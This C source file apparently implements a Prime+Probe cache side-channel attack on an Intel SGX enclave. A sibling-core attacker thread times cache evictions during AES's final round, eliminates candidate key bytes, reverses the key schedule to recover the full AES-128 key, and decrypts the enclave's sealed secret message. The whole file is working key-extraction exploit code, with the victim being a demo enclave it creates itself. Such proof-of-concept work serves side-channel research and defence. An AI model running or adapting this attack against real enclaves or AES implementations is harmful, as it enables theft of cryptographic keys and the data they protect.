#define _GNU_SOURCE
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <stdio.h>
#include <errno.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sgx_urts.h>
#include <sgx_tseal.h>
#include <sgx_trts.h>
#include <time.h>
#include "Enclave/victim_enclave_u.h"
#include "set_sched.h"
#include "cache.h"
#include "aes.h"

#define DEBUG_ENCLAVE 1
#define BLOCK_SIZE 16
#define ENTRY_SIZE 4
#define KEYLEN 16
#define ROUNDS 1
#define THRESHOLD 0

#define AES128_KEY_SIZE 16
#define AES_KEY_SCHEDULE_WORD_SIZE 4

// Sched. policy
#define SCHED_POLICY SCHED_RR
// Max. realtime priority
#define PRIORITY 0

/*
 * Mainthread and enclave need to be on the same 
 * phy. core but different log. core.
 * cat /proc/cpuinfo | grep 'core id'
 * core id		: 0
 * core id		: 1
 * core id		: 2
 * core id		: 3
 * core id		: 0
 * core id		: 1
 * core id		: 2
 * core id		: 3
 */
#define CPU 0
#define ENCLAVE_CPU 4



static void usage(char**);
static void run_enclave(sgx_enclave_id_t);
static void cleanUp(sgx_enclave_id_t);
static void enclave_thread(void);
static int eliminate(void);
static void calcBaseKey(void);
static void calcKey(void);
static void printKey(void);
static void decryptSecret(void);

/*
 * Global variables exist for alignment reasons.
 * Must not interfer with SBox cachelines.
 */
static int alignment_dummy __attribute__ ((aligned(4096)));
static int alignment_dummy_2 __attribute__ ((aligned(1024)));
static uint32_t evict_count[TABLESIZE/CACHELINESIZE];
static unsigned int n_hits;
static size_t i, j, x, count, cand, byte;
static int done_ret;

static sgx_launch_token_t token = {0};
static sgx_enclave_id_t eid;
static int updated;
static sgx_status_t ret;
static sgx_sealed_data_t *sealed_secret;
static uint32_t sealed_secret_size;

static pthread_t thread;
static pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;
static pid_t pid;
static volatile int flag;
static volatile int flag_out;
static volatile int done = 0;
static unsigned char candidates[16][256];
static int candidates_count[16];
static unsigned char cand_index;
static int attack_round = 0;

static uint8_t secret_key[KEYLEN];
static unsigned char in[BLOCK_SIZE];
static unsigned char out[BLOCK_SIZE];
static unsigned char enc_msg[BLOCK_SIZE];
static unsigned char *msg = "Top secret msg!";

/*
 * Print usage.
 */
void usage(char **argv) {
	printf("Usage: %s\n", argv[0]);
}

/*
 * Run encryption loop until measurement is done.
 */
void run_enclave(sgx_enclave_id_t eid) {
	fprintf(stderr, "[Enclave] Entering encryption loop\n");
	for(;;) {
		// run encryption loop
		if ( SGX_SUCCESS != (ret = encrypt_loop(eid, in, (unsigned char*) out, (int*) &flag, (int*) &flag_out))) {
			cleanUp(eid);
		}	
		if (done) {
			return;
		}
	}
}

/*
 * Destory enclave.
 */
void cleanUp(sgx_enclave_id_t eid) {
	sgx_status_t ret __attribute__ ((aligned (1024)));
	if ( SGX_SUCCESS != (ret = sgx_destroy_enclave(eid))) {
		printf( "[Enclave] Error destroying enclave (error 0x%x)\n", ret);
	}
}

/*
 * Pthread-function for running the enclave.
 */
static void enclave_thread(void) {

	eid = 0;
	updated = 0;
	ret = SGX_SUCCESS;

	if (SGX_SUCCESS != (ret = sgx_create_enclave("./Enclave/victim_enclave.so", DEBUG_ENCLAVE, &token, &updated, &eid, NULL))) {
		fprintf(stderr, "[Enclave] Error creating enclave (error 0x%x)\n", ret);
		exit(EXIT_FAILURE);
	}
		
	// GenerateKey
	if (SGX_SUCCESS != (ret = createSecret(eid))) {
		fprintf(stderr, "[Enclave] Error calling enclave\n (error 0x%x)\n", ret );
		cleanUp(eid);
		exit(EXIT_FAILURE);
	}

	// Store secret
	sealed_secret_size = getSecretSize(eid);
	if (sealed_secret_size == 0xFFFFFFFF) {
		cleanUp(eid);
		exit(EXIT_FAILURE);
	}
	sealed_secret = malloc(sealed_secret_size);
	if (sealed_secret == NULL) {
		perror("malloc");
		cleanUp(eid);
		exit(EXIT_FAILURE);
	}
	if (SGX_SUCCESS != (ret = storeSecret(eid, sealed_secret, sealed_secret_size))) {
		fprintf(stderr, "[Enclave] Error calling enclave\n (error 0x%x)\n", ret );
		cleanUp(eid);
		exit(EXIT_FAILURE);
	}
	
	// Load secret 
	if (SGX_SUCCESS != (ret = loadSecret(eid, sealed_secret))) {
		fprintf(stderr, "[Enclave] Error calling enclave\n (error 0x%x)\n", ret );
		cleanUp(eid);
		exit(EXIT_FAILURE);
	}

	free(sealed_secret);
	
	// encrypt secret msg
	if (SGX_SUCCESS != (ret = encrypt_step(eid, msg))) {
		fprintf(stderr, "[Enclave] Error calling enclave\n (error 0x%x)\n", ret );
		cleanUp(eid);
		exit(EXIT_FAILURE);
	}
	if (SGX_SUCCESS != (ret = encrypt_final(eid, enc_msg))) {
		fprintf(stderr, "[Enclave] Error calling enclave\n (error 0x%x)\n", ret );
		cleanUp(eid);
		exit(EXIT_FAILURE);
	}
	pthread_mutex_lock(&lock);
	fprintf(stderr, "[Attacker] Encrypting plaintext with key only known to enclave\n");
	fprintf(stderr, "[Attacker] Plaintext: %s\n", msg);
	fprintf(stderr, "[Enclave] Ciphertext: ");
	for(byte=0; byte<KEYLEN; byte++) {
		fprintf(stderr, "%02hhx", enc_msg[byte]);
	}
	fprintf(stderr, "\n");

	// set cpu for enclave thread
	cpu_set_t set;
	CPU_ZERO(&set);
	CPU_SET(ENCLAVE_CPU, &set);
	errno = pthread_setaffinity_np(thread, sizeof(cpu_set_t), &set);
	if(errno != 0) {
		cleanUp(eid);
		exit(EXIT_FAILURE);
	}

	fprintf(stderr, "[Enclave] Enclave running on %d\n", sched_getcpu());
	pthread_mutex_unlock(&lock);

	
	// start enclave encryption loop
	run_enclave(eid);

}

/*
 * Elimination Method for finding the correct key bytes.
 * Source: https://dl.acm.org/citation.cfm?id=1756531
 */
static int eliminate(void) {
	done_ret = 0;
	// take every cache that wasn't evicted
	for(count = 0; count < BLOCK_SIZE; count++) {
		if (evict_count[count] > THRESHOLD) {
			continue;
		}
		done_ret = 1;
		// remove resulting keybytes from candidates list
		for(cand = 0; cand < BLOCK_SIZE; cand++) {
			for(byte = 0; byte < BLOCK_SIZE; byte++) {
				cand_index = out[cand] ^ (Te4_0[((CACHELINESIZE/ENTRY_SIZE)*count)+byte] >> 24);
				if (candidates[cand][cand_index] != 0x00) {
					// eliminate bytes from key candidates, only most significant byte of entry is needed
					candidates[cand][cand_index] = 0x00;
					// reduce number of candidates for keybyte
					candidates_count[cand] -= 1;
				}
				// if every keybyte has one candidate left, we're finished
				if (candidates_count[cand] > 1) {
					done_ret = 0;
				}
			} 
		}
	}	
	return done_ret;
}

/*
 * https://github.com/cmcqueen/aes-min/blob/master/aes-otfks-decrypt.c
 *
 * This is used for aes128_otfks_decrypt(), on-the-fly key schedule decryption.
 * rcon for the round must be provided, out of the sequence:
 *	   54, 27, 128, 64, 32, 16, 8, 4, 2, 1
 * Subsequent values can be calculated with aes_div2().
 */

static void aes128_key_schedule_inv_round(uint8_t rcon) {
	uint8_t round;
	uint8_t *s_key_0 = secret_key + AES128_KEY_SIZE - AES_KEY_SCHEDULE_WORD_SIZE;
	uint8_t *s_key_m1 = s_key_0 - AES_KEY_SCHEDULE_WORD_SIZE;

	for (round = 1; round < AES128_KEY_SIZE / AES_KEY_SCHEDULE_WORD_SIZE; ++round) {
		/* XOR in previous word */
		s_key_0[0] ^= s_key_m1[0];
		s_key_0[1] ^= s_key_m1[1];
		s_key_0[2] ^= s_key_m1[2];
		s_key_0[3] ^= s_key_m1[3];

		s_key_0 = s_key_m1;
		s_key_m1 -= AES_KEY_SCHEDULE_WORD_SIZE;
	}

	/* Rotate previous word and apply S-box. Also XOR Rcon for first byte. */
	s_key_m1 = secret_key + AES128_KEY_SIZE - AES_KEY_SCHEDULE_WORD_SIZE;
	s_key_0[0] ^= Te4_0[s_key_m1[1]] ^ rcon;
	s_key_0[1] ^= Te4_0[s_key_m1[2]];
	s_key_0[2] ^= Te4_0[s_key_m1[3]];
	s_key_0[3] ^= Te4_0[s_key_m1[0]];
}

/*
 * Reverse key schedule for a AES 10th-round key.
 */
static void calcBaseKey(void) {
	int round, byte;
	uint8_t rcon[] = {54, 27, 128, 64, 32, 16, 8, 4, 2, 1};
	for(round = 0; round < 10; round++) {
		aes128_key_schedule_inv_round(rcon[round]);
	}
}

/*
 * Rebuild 10th round key.
 */
static void calcKey(void) {
	for(cand = 0; cand < BLOCK_SIZE; cand++){
		for(byte = 0; byte < BLOCK_SIZE*BLOCK_SIZE; byte++){
			if (candidates[cand][byte] != 0x00) {
				secret_key[cand] = byte;
				break;
			}
		}
	}
}

/*
 * Print secret key.
 */
static void printKey(void) {
	int byte;
	for(byte = 0; byte < KEYLEN; byte++){
		fprintf(stderr, "%02hhx", secret_key[byte]);
	}
	fprintf(stderr, "\n");
}

/*
 * Decrypt secret with leaked key
 */
static void decryptSecret(void) {
	/*
	 * Some weird OpenSSL lowlevel bug is causing buffer-overflows
	 */
	char dummy_buf[100];
	AES_KEY leaked_enc_key;
	AES_KEY leaked_dec_key;

	fprintf(stderr, "[Attacker] Original ciphertext: ");
	for(byte=0; byte<KEYLEN; byte++) {
		fprintf(stderr, "%02hhx", enc_msg[byte]);
	}
	fprintf(stderr, "\n");

	fprintf(stderr, "[Attacker] Decrypting message with leaked key\n");
	AES_set_decrypt_key(secret_key, KEYLEN*8, &leaked_dec_key);
	AES_decrypt(enc_msg, out, &leaked_dec_key);
	fprintf(stderr, "[Attacker] Decrypted plaintext: %s\n", out);


	fprintf(stderr, "[Attacker] Encrypting plaintext again with leaked key\n");
	AES_set_encrypt_key(secret_key, KEYLEN*8, &leaked_enc_key);
	AES_encrypt(out, enc_msg, &leaked_enc_key);
	fprintf(stderr, "[Attacker] Encrypted plaintext: ");
	for(byte=0; byte<KEYLEN; byte++) {
		fprintf(stderr, "%02hhx", enc_msg[byte]);
	}
	fprintf(stderr, "\n");
}





/*
 * Start enclave in seperated pthread, perform measurement in main thread.
 */
int main(int argc,char **argv) {
	// align stack, so it doesn't interfer with the measurement
	volatile int alignment_stack __attribute__ ((aligned(4096)));
	volatile int alignment_stack_2 __attribute__ ((aligned(1024)));

	if (argc != 1) {
		usage(argv);
		return EXIT_FAILURE;
	}
	
	// fill candidates
	for(j=0; j < BLOCK_SIZE; j++) {
		candidates_count[j] = 256;
		for(i=0; i<BLOCK_SIZE*BLOCK_SIZE; i++) {
			candidates[j][i] = 1;
		}
	}	


	//pin to cpu 
	if ((pin_cpu(CPU)) == -1) {
		fprintf(stderr, "[Attacker] Couln't pin to CPU: %d\n", CPU);
		return EXIT_FAILURE;
	}

	// set sched_priority
	if ((set_real_time_sched_priority(SCHED_POLICY, PRIORITY)) == -1) {
		fprintf(stderr, "[Attacker] Couln't set scheduling priority\n");
		return EXIT_FAILURE;
	}

	// Start enclave thread
	fprintf(stderr, "[Attacker] Creating thread\n");
	errno = pthread_create(&thread, NULL, (void* (*) (void*)) enclave_thread, NULL);	
	if (errno != 0) {
		return EXIT_FAILURE;
	}	

	// initalize random generator
	srand(time(NULL));

	pthread_mutex_lock(&lock);
	fprintf(stderr, "[Attacker] Attacker running on %d\n", sched_getcpu());
	pthread_mutex_unlock(&lock);
	for (;;) {
		
		// set plaintext
		for(x=0; x < KEYLEN; x++) {
			in[x] = (rand() % 256);	
		}
		memset(evict_count, 0x0, (TABLESIZE/CACHELINESIZE)*4);
		for(j=0; j<ROUNDS; j++) {
			for (i = 0; i < TABLESIZE/CACHELINESIZE; i++) {
				// aes round 0-9
				flag = 0x1;
				while(flag_out != 0x1);

				// fill cache
				prime();

				// aes round 10
				flag = 0x2;
				while(flag_out != 0x2);


				// probe cache
				evict_count[i] += probe(i);

				// finish
				flag = 0x3;
				while(flag_out != 0x3);
			}
		}

		fprintf(stderr, "[Attacker] [%d] Remaining key bytes: ", attack_round++);
		for(i = 0; i < (TABLESIZE/CACHELINESIZE); i++) {
			fprintf(stderr, "%d ", candidates_count[i]);
		}
		fprintf(stderr, "\n");

		if (eliminate() == 1) {
			fprintf(stderr, "[Attacker] Found key!\n");
			// stop enclave
			done = 1;
			flag = 0x4;
			// show leaked key
				calcKey();	
			fprintf(stderr, "[Attacker] The leaked 10th-round-key is: ");
			printKey();
			// calc base key
				calcBaseKey();	
			fprintf(stderr, "[Attacker] The initial encryption key was: ");
			printKey();
			// decrypt secret
			decryptSecret();
			break;
		}

	}
	fprintf(stderr, "[Attacker] Stopping enclave\n");
	pthread_join(thread, NULL);
	return EXIT_SUCCESS;
}

